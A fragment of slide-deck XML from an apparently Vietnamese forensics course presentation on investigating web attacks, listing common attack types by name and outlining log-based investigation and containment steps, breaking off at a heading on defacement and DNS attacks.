                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>hỏi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> Chapter 3 - Investigating Web Attacks</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Google Shape;134;p16"/>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5" name="Google Shape;135;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1165225" y="4300900"/>
            <a:ext cx="88668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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Các loại tấn công Web phổ biến: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="136" name="Google Shape;136;p16" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="4271962"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1028700" y="4766725"/>
            <a:ext cx="3241500" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cross-site Scripting (XSS)</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cross - site request Forgery (CSRF)</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>SQL Injection </a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Code Injection</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Google Shape;138;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4133450" y="4766725"/>
            <a:ext cx="3507300" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cookie poisoning</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Zero-day attack</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cryptographic interception</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Parameter tempering</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7889300" y="4766725"/>
            <a:ext cx="3241500" cy="1100700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> Buffer overflow</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Authentication hijacking</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Directory traversal</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> DMZ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>protocal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> attack</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="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43"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="144" name="Google Shape;144;p17" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="504825" y="1499800"/>
            <a:ext cx="11030100" cy="4546850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Google Shape;145;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1392250" y="2037525"/>
            <a:ext cx="45804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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cách điều tra các loại tấn công Web: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Google Shape;146;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2159925" y="2593000"/>
            <a:ext cx="7739400" cy="2301300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="45720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Phân tích nhật ký máy chủ Web, FTP và hệ thống cục bộ để xác nhận cuộc tấn công</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="45720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Kiểm tra thông tin tệp nhật ký về dấu thời gian, địa chỉ IP, mã trạng thái HTTP và tài nguyên được yêu cầu</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="45720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Xác định bản chất của cuộc tấn công để ngăn chặn kịp thời</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="45720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Khoang vùng nguồn tấn công bằng cách sử dụng nhật ký tường lửa và IDS</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="45720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Chặn cuộc tấn công bằng cách đóng cổng hoặc lỗ hổng mà kẻ tấn công đã sử dụng, đồng thời chặn địa chỉ IP đó.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="45720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Ngắt kết nối các hệ thống bị xâm nhập khỏi mạng cho đến khi chúng được làm sạch.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="45720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Tiến hành điều tra từ địa chỉ IP của kẻ tấn công</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Google Shape;147;p17"/>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III. Trả lời câu hỏi Chapter 3 - Investigating Web Attacks</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Google Shape;148;p17"/>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49" name="Google Shape;149;p17" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="827100" y="2008587"/>
            <a:ext cx="476250" cy="381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53"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="154" name="Google Shape;154;p18" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="504825" y="1499800"/>
            <a:ext cx="11030100" cy="4962375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Google Shape;155;p18"/>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III. Trả lời câu hỏi Chapter 3 - Investigating Web Attacks</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Google Shape;156;p18"/>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7" name="Google Shape;157;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1643171" y="1772200"/>
            <a:ext cx="87534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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thay đổi giao diện trang Web và tấn công qua DNS: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1643175" y="2368300"/>
            <a:ext cx="8423100" cy="1100700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
